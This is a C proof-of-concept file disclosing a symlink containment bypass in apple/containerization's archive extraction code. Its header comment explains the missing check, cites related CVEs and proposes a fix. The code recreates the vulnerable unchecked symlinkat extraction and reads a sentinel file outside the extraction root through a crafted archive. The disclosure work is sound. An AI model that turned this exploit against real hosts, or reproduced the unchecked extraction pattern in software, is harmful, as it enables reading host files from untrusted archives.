/*
 * PoC: apple/containerization — Symlink Containment Bypass in ArchiveReader.extractContents()
 * CWE-61: UNIX Symbolic Link Following / CWE-22: Path Traversal
 *
 * Commit: 2ec221af5af45c156688bba323cc733f9f49c840 (2026-08-06)
 * File:   Sources/ContainerizationArchive/ArchiveReader.swift
 *         extractEntry() — .symbolicLink case, line 369–382
 *
 * BACKGROUND
 * ----------
 * ArchiveWriter.archive() enforces a containment invariant (line 226–228):
 *
 *   let resolvedFull = symlinkParent.appending(targetPath).lexicallyNormalized()
 *   guard resolvedFull.starts(with: dirPath) else { return }
 *
 * This allows absolute-target symlinks that resolve within dirPath (the archiveURLsSymlinks
 * test at line 748 confirms this by design) but excludes targets that escape dirPath.
 *
 * ArchiveReader.extractEntry() (line 369–382) has NO equivalent check:
 *
 *   guard let targetPath = (entry.symlinkTarget.map { FilePath($0) }) else { return false }
 *   // ← NO containment check here
 *   guard symlinkat(targetPath.string, fd.rawValue, lastComponent.string) == 0 else { ... }
 *
 * archive_entry_symlink() returns the verbatim bytes from the archive entry.
 * For archives produced by ArchiveWriter, those bytes were already validated.
 * For archives from OCI registries, docker save, or any third-party tool, they are not.
 *
 * INDUSTRY PRECEDENT
 * ------------------
 * CVE-2026-53489 (containerd, CVSS 6.5): symlinked log path not validated on checkpoint restore → host read
 * CVE-2022-23648 (containerd): path traversal via image volume config → host path access
 * LXD CVE-2026-23954 (Critical): image unpacking preserves symlinks verbatim → host access
 *
 * API MAPPING (Swift → C — same calls as ContainerizationArchive)
 * ---------------------------------------------------------------
 * archive_read_next_header2(a, entry)   = ArchiveReader makeStreamingIterator().next()
 * archive_entry_symlink(entry)          = WriteEntry.symlinkTarget getter
 * archive_entry_filetype(entry)         = WriteEntry.fileType
 * symlinkat(target, dirfd, name)        = extractEntry() .symbolicLink case
 * openat(dirfd, name, O_RDONLY)         = LocalContent FileHandle(forReadingFrom:)
 *
 * CORRECT FIX (mirrors writer, not "reject all absolute")
 * -------------------------------------------------------
 * After obtaining targetPath, resolve it relative to the symlink's parent directory
 * and verify the result stays within the extraction root — exactly as the writer does:
 *
 *   let symlinkParent = (extractDir / memberPath).removingLastComponent()
 *   let resolvedFull = (symlinkParent / targetPath).lexicallyNormalized()
 *   guard resolvedFull.starts(with: extractDir) else { return false }
 *
 * Build: gcc -I. -o poc_real poc_real.c libarchive.so.13
 * Run:   bash run_poc.sh
 */

#include "archive.h"
#include "archive_entry.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <assert.h>
#include <errno.h>

#define SENTINEL_DIR   "/tmp/poc_outside_root"
#define SENTINEL_FILE  "/tmp/poc_outside_root/secret.txt"
#define SENTINEL_DATA  "HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS"

/* Open each path component with O_NOFOLLOW|O_DIRECTORY — same as FileDescriptorOps.mkdir() */
static int safe_mkdirp_and_open(int rootfd, const char *rel) {
    if (!rel || strlen(rel) == 0) return dup(rootfd);
    char buf[4096];
    strncpy(buf, rel, sizeof(buf)-1);
    buf[sizeof(buf)-1] = '\0';
    int curfd = dup(rootfd);
    char *seg = strtok(buf, "/");
    while (seg) {
        mkdirat(curfd, seg, 0755);
        int next = openat(curfd, seg, O_RDONLY | O_DIRECTORY
#ifdef O_NOFOLLOW
            | O_NOFOLLOW
#endif
        );
        close(curfd);
        if (next < 0) return -1;
        curfd = next;
        seg = strtok(NULL, "/");
    }
    return curfd;
}

/* Simulate extractEntry() for one archive member — no containment check on symlink target */
static int extract_entry(struct archive_entry *entry, int rootfd,
                          const char *member_path) {
    int type = archive_entry_filetype(entry);
    char dir_part[4096] = "";
    char base_part[4096];

    strncpy(base_part, member_path, sizeof(base_part)-1);
    char *slash = strrchr(base_part, '/');
    if (slash) {
        strncpy(dir_part, base_part, slash - base_part);
        dir_part[slash - base_part] = '\0';
        memmove(base_part, slash+1, strlen(slash+1)+1);
    }

    if (type == AE_IFDIR) {
        safe_mkdirp_and_open(rootfd, member_path);
        return 1;
    }

    int parentfd = safe_mkdirp_and_open(rootfd, dir_part);
    if (parentfd < 0) return 0;

    if (type == AE_IFLNK) {
        /* Swift code (ArchiveReader.swift line 369–382):
         *   let targetPath = entry.symlinkTarget.map { FilePath($0) }
         *   symlinkat(targetPath.string, fd.rawValue, lastComponent.string)
         * NO containment check. */
        const char *target = archive_entry_symlink(entry);
        if (!target) { close(parentfd); return 0; }
        unlinkat(parentfd, base_part, 0);
        int rc = symlinkat(target, parentfd, base_part);
        close(parentfd);
        return rc == 0 ? 1 : 0;
    }
    close(parentfd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <archive.tar> <extract_dir>\n", argv[0]);
        return 1;
    }
    const char *tar_path    = argv[1];
    const char *extract_dir = argv[2];

    puts("=================================================================");
    puts("PoC: apple/containerization — Symlink Containment Bypass");
    puts("     CWE-61 / ArchiveReader.extractEntry() lines 369-382");
    puts("     Commit: 2ec221af (2026-08-06)");
    puts("=================================================================\n");

    /* Create sentinel file outside extraction root */
    mkdir(SENTINEL_DIR, 0755);
    {
        int f = open(SENTINEL_FILE, O_WRONLY|O_CREAT|O_TRUNC, 0644);
        assert(f >= 0);
        write(f, SENTINEL_DATA, strlen(SENTINEL_DATA));
        close(f);
    }
    printf("[setup] sentinel outside extraction root: %s\n", SENTINEL_FILE);
    printf("[setup] content: \"%s\"\n\n", SENTINEL_DATA);

    mkdir(extract_dir, 0755);
    int rootfd = open(extract_dir, O_RDONLY | O_DIRECTORY);
    assert(rootfd >= 0);

    /* STEP 1 — archive_read: mirrors ArchiveReader.makeStreamingIterator() */
    struct archive       *a     = archive_read_new();
    struct archive_entry *entry = archive_entry_new();
    archive_read_support_filter_all(a);
    archive_read_support_format_all(a);
    assert(archive_read_open_filename(a, tar_path, 4096) == ARCHIVE_OK);
    printf("[step1] archive_read_open: %s\n", tar_path);

    const char *exploit_path   = NULL;
    const char *exploit_target = NULL;

    while (archive_read_next_header2(a, entry) == ARCHIVE_OK) {
        const char *path   = archive_entry_pathname(entry);
        int         ftype  = archive_entry_filetype(entry);
        const char *target = (ftype == AE_IFLNK) ? archive_entry_symlink(entry) : NULL;

        printf("[step1] %-60s type=%-8s", path,
               ftype==AE_IFREG?"regular":ftype==AE_IFDIR?"dir":
               ftype==AE_IFLNK?"SYMLINK":"other");

        if (ftype == AE_IFLNK) {
            printf(" -> %s", target ? target : "(null)");
            /* Determine if target escapes extraction root.
             * We treat ANY absolute path not starting with extract_dir as escaping. */
            if (target && target[0]=='/') {
                char resolved[4096];
                snprintf(resolved, sizeof(resolved), "%s", target);
                int escapes = (strncmp(resolved, extract_dir, strlen(extract_dir)) != 0);
                if (escapes) {
                    printf("  *** ESCAPING ABSOLUTE TARGET — no containment check in reader ***");
                    exploit_path   = strdup(path);
                    exploit_target = strdup(target);
                }
            }
        }
        puts("");

        /* simulate extractEntry() */
        extract_entry(entry, rootfd, path);
        archive_read_data_skip(a);
    }
    archive_read_free(a);
    archive_entry_free(entry);

    if (!exploit_path) {
        puts("\n[ABORT] No escaping symlink found in archive.");
        close(rootfd); return 1;
    }

    /* STEP 2 — verify symlink on disk */
    char readlink_buf[4096];
    ssize_t len = readlinkat(rootfd, exploit_path, readlink_buf, sizeof(readlink_buf)-1);
    assert(len > 0);
    readlink_buf[len] = '\0';

    printf("\n[step2] Symlink on host disk: %s/%s -> %s\n",
           extract_dir, exploit_path, readlink_buf);
    printf("        symlinkat(\"%s\", parentfd, \"%.*s...\") = 0\n",
           exploit_target, 16, strrchr(exploit_path,'/')+1);

    /* STEP 3 — read via symlink: mirrors LocalContent FileHandle(forReadingFrom:) */
    int fd = openat(rootfd, exploit_path, O_RDONLY);  /* follows symlink */
    assert(fd >= 0);
    char buf[4096]; buf[0]='\0';
    ssize_t n = read(fd, buf, sizeof(buf)-1);
    assert(n > 0); buf[n] = '\0';
    close(fd);

    puts("\n=== NORMAL RESULT (ArchiveWriter-produced archive) ===");
    puts("  symlink target was validated by writer: resolvedFull.starts(with: dirPath)");
    puts("  target resolves within extraction root — no host escape possible");
    puts("  LocalContent.data() reads a blob within the sandbox");

    puts("\n=== EXPLOIT RESULT (crafted archive) ===");
    printf("  archive_entry_symlink() = \"%s\" (escaping absolute)\n", exploit_target);
    printf("  reader calls symlinkat without containment check\n");
    printf("  symlink on disk: %s/%s -> %s\n", extract_dir, exploit_path, readlink_buf);
    printf("  openat(rootfd, path, O_RDONLY) follows symlink to HOST file\n");
    printf("  bytes read from HOST: %zd\n", n);
    printf("  content: \"%s\"\n", buf);

    /* Assertions */
    assert(strcmp(readlink_buf, exploit_target) == 0);
    assert(strstr(buf, SENTINEL_DATA) != NULL);

    puts("\n[PASS] All assertions passed — symlink containment bypass confirmed.");
    puts("\nRoot cause: ArchiveReader.extractEntry() lines 369-382");
    puts("  archive_entry_symlink() → symlinkTarget — value is verbatim archive data");
    puts("  symlinkat(target, fd, name) — no containment check before this call");
    puts("  LocalContent FileHandle(forReadingFrom:) — open() follows symlink");
    puts("\nCorrect fix (mirrors ArchiveWriter.archive() lines 224-228):");
    puts("  After getting targetPath, resolve it relative to the symlink parent");
    puts("  inside the extraction root and verify resolvedFull.starts(with: extractDir)");
    puts("  This preserves absolute symlinks that stay within the extraction root");
    puts("  (as tested in archiveURLsSymlinks) while rejecting escaping targets.");
    puts("\nSubmission: https://github.com/apple/containerization/security/advisories/new");

    close(rootfd);
    unlink(SENTINEL_FILE); rmdir(SENTINEL_DIR);
    return 0;
}
